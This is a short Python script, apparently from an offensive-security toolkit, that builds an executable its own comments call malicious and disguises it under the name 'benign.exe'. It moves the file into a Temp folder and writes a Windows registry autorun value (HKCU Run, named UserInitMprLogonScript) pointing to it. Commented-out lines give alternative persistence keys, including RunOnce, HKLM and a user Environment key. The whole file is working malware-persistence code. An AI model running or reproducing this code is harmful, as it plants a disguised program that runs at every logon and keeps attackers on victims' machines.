import os,shutil,winreg

filedir=os.path.join(os.getcwd(),"Temp")
filename="benign.exe"
filepath=os.path.join(filedir,filename)

if os.path.isfile(filepath):
    os.remove(filepath)

#Use BuildExe to create malicious executable
os.system('python BuildExe.py')

#Move malicious executable to desired directory
shutil.move(filename,filedir)


reghive=winreg.HKEY_CURRENT_USER
regpath="SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
# regpath="SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# reghive=winreg.HKEY_LOCAL_MACHINE
# regpath="SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
# regpath="SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# reghive=winreg.HKEY_USERS
# regpath="S-1-5-21-2209964974-4002655558-1579731429-1001\Environment"

#Add registry autorun key
reg=winreg.ConnectRegistry(None,reghive) #none means local machine
key=winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
winreg.SetValueEx(key,"UserInitMprLogonScript",0,winreg.REG_SZ,filepath)

